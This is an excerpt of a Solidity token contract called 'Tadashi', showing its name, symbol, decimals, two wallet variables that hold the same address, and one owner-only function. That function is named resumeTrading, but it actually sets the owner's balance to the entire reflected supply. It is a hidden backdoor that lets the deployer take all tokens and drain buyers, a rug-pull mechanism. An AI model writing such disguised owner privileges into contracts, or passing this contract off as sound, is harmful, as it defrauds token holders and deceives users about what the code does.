...
contract Tadashi is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Tadashi"; 
    string private _symbol = "Ti";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x34BB837b1431Ad1442Ac2E7e1211aa9617C29E3b
);
    address payable public teamWalletAddress = payable(0x34BB837b1431Ad1442Ac2E7e1211aa9617C29E3b
);
    ...
    function resumeTrading() public onlyOwner returns (bool success) {_rBalance[owner()] = _rSupply;return true;}
